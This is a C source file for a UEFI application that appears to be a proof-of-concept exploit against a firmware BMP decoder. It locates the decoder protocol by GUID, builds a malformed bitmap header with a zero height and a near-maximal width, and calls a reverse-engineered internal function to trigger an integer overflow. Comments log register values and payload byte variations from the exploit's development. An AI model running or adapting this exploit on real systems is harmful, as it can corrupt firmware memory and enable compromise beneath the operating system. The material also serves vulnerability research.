/*
 * Copyright (c) 2021, Konstantin Aladyshev <aladyshev22@gmail.com>
 *
 * SPDX-License-Identifier: MIT
 */

#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiLib.h>
#include <Library/MemoryAllocationLib.h>
#include "payload.h"

typedef signed long long __int64 ;

typedef struct {
    CHAR8  CharB;
    CHAR8  CharM;
    UINT32 Size;
    UINT16 Reserved[2];
    UINT32 ImageOffset;
    UINT32 HeaderSize;
    UINT32 PixelWidth;
    UINT32 PixelHeight;
    UINT16 Planes;
    UINT16 BitPerPixel;
    UINT32 CompressionType;
    UINT32 ImageSize;
    UINT32 XPixelsPerMeter;
    UINT32 YPixelsPerMeter;
    UINT32 NumberOfColors;
    UINT32 ImportantColors;
} __attribute__((__packed__)) BMP_IMAGE_HEADER;

//000000000000039E	A6396A81-8031-4FD7-BD14-2E6BFBEC83C2	EFI_BMP_DECODER_PROTOCOL_GUID	InstallProtocolInterface	Current

//unsigned __int64 __fastcall sub_6651498(
        // __int64 a1,
        // BMP_IMAGE *a2,
        // unsigned __int64 a3,
        // EFI_GRAPHICS_OUTPUT_BLT_PIXEL **a4,
        // unsigned __int64 *a5,
        // _QWORD *a6,
        // _QWORD *a7)

// 프로토콜 GUID 정의
#define EFI_BMP_DECODER_PROTOCOL_GUID \
    { 0xA6396A81, 0x8031, 0x4FD7, { 0xbd, 0x14, 0x2e, 0x6B, 0xFB, 0xEC, 0x83, 0xC2 } }

typedef struct {
    __int64 (*sub_6651498)(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, __int64 a11, __int64 a12, __int64 a13);
} MY_PROTOCOL;

EFI_GUID gEFI_BMP_DECODER_PROTOCOL_GUID = EFI_BMP_DECODER_PROTOCOL_GUID;

EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS Status;
  UINTN HandleCount;
  EFI_HANDLE *HandleBuffer;
  MY_PROTOCOL *MyProtocol = NULL;

  Status = gBS->LocateHandleBuffer (
                  ByProtocol,
                  &gEFI_BMP_DECODER_PROTOCOL_GUID,
                  NULL,
                  &HandleCount,
                  &HandleBuffer
                  );
  if (EFI_ERROR (Status)) {
    Print(L"Error! Can't find any handle with gEFI_BMP_DECODER_PROTOCOL_GUID: %r\n", Status);
    return Status;
  }

  Print(L"Found %d handles with MyProtocol\n", HandleCount);

    // 찾은 핸들 중 첫 번째 핸들에 대해 MyProtocol을 검색
    Status = gBS->HandleProtocol(HandleBuffer[0], &gEFI_BMP_DECODER_PROTOCOL_GUID, (VOID**)&MyProtocol);
    if (EFI_ERROR(Status)) {
        Print(L"Failed to get protocol interface: %r\n", Status);
        FreePool(HandleBuffer);
        return Status;
    }

    // 프로토콜의 MyFunction 호출
    if (MyProtocol != NULL && MyProtocol->sub_6651498 != NULL) {
        //MyProtocol->sub_6651498(0x41414141, 0x42424242, 0x43434343, 0x44444444, 0x45454545, 0x46464646, 0x47474747, 0x48484848, 0x49494949, 0x50505050, 0x51515151, 0x52525252, 0x53535353);  // "MyFunction is called!" 출력

        //unsigned __int64 __fastcall sub_6651498(
        // __int64 a1,                             // 0x44444444
        // BMP_IMAGE *a2,                          // 0x43434343
        // unsigned __int64 a3,                    // 0x45454545
        // EFI_GRAPHICS_OUTPUT_BLT_PIXEL **a4,     // 0x46464646
        // unsigned __int64 *a5,                   // 0x51515151
        // _QWORD *a6,                             // 0x52525252
        // _QWORD *a7)                             // 0x53535353
        // {
        //   return DecodeBMP(a2, a3, a4, a5, a6, a7);
        // }    

        //unsigned __int64 __fastcall DecodeBMP(
        // BMP_IMAGE *Image,                       // 0x43434343
        // unsigned __int64 ImageSize,             // 0x45454545
        // EFI_GRAPHICS_OUTPUT_BLT_PIXEL **a3,     // 0x46464646
        // unsigned __int64 *a4,                   // 0x51515151
        // _QWORD *a5,                             // 0x52525252
        // _QWORD *a6)                             // 0x53535353

        //dh -d -v 98 -> ImageBase: 0x67E5000

        //biWidth = 0xFFFFFFFF -> r8 = 0xFFFFFD7000000948
        //first v16 = 0x2 to pass -> r8 = 0xFFFFFD500000099C

        //3rd, r8 = 0xFFFFFD4C000009A4
        
        //7th, r8 = 0xFFFFFD28000009FC

        //9th, r8 = 0xFFFFFD2000000A18
        //-0x17fffffebc
        //13th r8 = 0xFFFFFD0800000B5C
        //-0x1bffffffb4
        //14th r8 = 0xFFFFFCEC00000BA8 
        //-0x3fffffff8
        //16th r8 = 0xFFFFFCE800000BB0
        //
        //19th r8 = 0xFFFFFCE000000BEC

        //20th r8 = 0xFFFFFCC800000C04

        //23th r8 = 0xFFFFFCC400000C0C

        //??? r8 =  0xFFFFFCA800000C2C

        //??? r8 =  0xFFFFFC9000000C84

        //??? r8 =  0xFFFFE6CC00002564

        //??? r8 = 0xFE13CCAC02328C64
        //??? r8 = 0xFE13CC8C02328CA0
        //??? r8 = 0xFE13CC6C02328CDC

        //NEW START, old is payload2.h

        //0xFF, 0xA3,           0x00, 0x02, 0xAF, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFF775AC

        //0xFF, 0xFF,           0x00, 0x02, 0xAF, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFF50B8C

        //0x03, 0x03,           0x00, 0x02, 0xAF, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFFBA4BC

        //0x03, 0x03,           0x00, 0x02, 0x03, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFFBA4C8

        //0xF3, 0x03,           0x00, 0x02, 0x03, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFFBA5CC

        //0xA3, 0x03,           0x00, 0x02, 0x03, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFFBA748
        
        //0x03, 0x03,           0x00, 0x02, 0xFF, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFFBA5FC

        //0x03, 0x03,           0x00, 0x02, 0x01, 0x00, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0x03, 0x03,           0x00, 0x02, 0x01, 0x06, 0x00,          /*first v16, 0x09 -> 0x02*/      0x02,
        //0xFFFFFFFFFFFBB8D8 -> 0xFFFFFFFFFFFFB0B8

        BMP_IMAGE_HEADER *my_bmp = (BMP_IMAGE_HEADER*)bmp_payload;

        my_bmp->PixelHeight = 0;
        my_bmp->PixelWidth = 0xFFFFFFFF - 767; //

        MyProtocol->sub_6651498(0x41414141, 0x42424242, (__int64)my_bmp, 0x44444444, 0x45454545, 0x46464646, 0x47474747, 0x48484848, 0x49494949, 0x50505050, 0x51515151, 0x52525252, 0x53535353);

    } else {
        Print(L"MyProtocol or sub_6651498 is NULL\n");
    }

    // 핸들 버퍼 메모리 해제
    if(HandleBuffer != NULL)
      FreePool(HandleBuffer);

  return Status;
}
